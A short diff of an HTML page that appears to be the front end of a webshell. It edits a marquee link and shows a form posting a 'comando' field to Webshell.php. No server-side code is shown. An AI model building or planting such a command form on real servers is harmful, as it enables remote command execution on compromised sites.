@@ -9,7 +9,7 @@
 
 <body>
 	<img src="BoringGraveAmericanbobtail-small.gif">
-	<marquee behavior="slide"><lnk>https://github.com/LeanerDev</lnk></marquee>
+	<marquee behavior="slide"><lnk>https://github.com/LeanerDev</marquee>
 <form  action="Webshell.php" method="POST">
 comando: <br>
 <input type=text name="comando">
